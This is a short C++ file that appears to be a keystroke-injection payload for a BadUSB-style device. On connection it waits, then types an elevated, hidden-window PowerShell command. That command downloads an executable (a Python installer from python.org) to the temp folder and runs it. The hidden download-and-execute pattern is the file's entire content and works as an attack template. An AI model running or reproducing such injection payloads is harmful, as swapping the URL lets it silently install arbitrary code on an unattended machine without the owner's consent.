#include "alt.hpp"

// When you connect the device for the first time, it takes time for the system to detect it
BEGIN(10000)
    const char *str = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"
    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/py_install.exe'); %temp%/py_install.exe";
    RUN_ENTER_AS_ADMIN(str, 0)
END()